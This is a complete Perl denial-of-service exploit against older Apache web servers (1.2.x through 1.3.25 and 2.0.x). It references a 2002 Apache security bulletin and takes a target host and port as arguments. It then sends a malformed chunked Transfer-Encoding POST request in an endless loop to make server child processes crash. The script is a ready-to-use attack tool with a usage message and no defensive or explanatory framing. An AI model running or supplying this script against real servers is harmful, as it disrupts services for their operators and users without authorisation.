#!/usr/bin/perl -w
use IO::Socket;
#$Denial of service for apache webserver 1.2.X < .26 && 2.0.X
#$http://httpd.apache.org/info/security_bulletin_20020620.txt
#$Cause [Mon Jun 24 11:11:03 2002] [notice] child pid 476 exit signal Segmentation fault (11)
#$contact : <Luis Wong> lwong@mpsnet.net.mx http://www.sourceforge.net/projects/sfirewall

if(@ARGV == 2){
    my $host = $ARGV[0];
    my $port = $ARGV[1];
    my $i;
    while(){
	$sock = IO::Socket::INET->new(PeerAddr => $host,
				      PeerPort => "$port",
				      Proto => 'tcp');
	unless($sock){
	    die "jeje can't connect.";
	}
	$sock->autoflush(1);
	print $sock "POST /foo.htm HTTP/1.1\nHost: $host\nTransfer-Encoding: chunked\n\n90000000\n\n";
	while ( <$sock> ){ 
	    print; 
	}
	close $sock;
       	$i++;
	print "Working ... $i.\n";
    }
}else{
    print "[Usage]...\n./$0 'HosT' [port] \n";
}







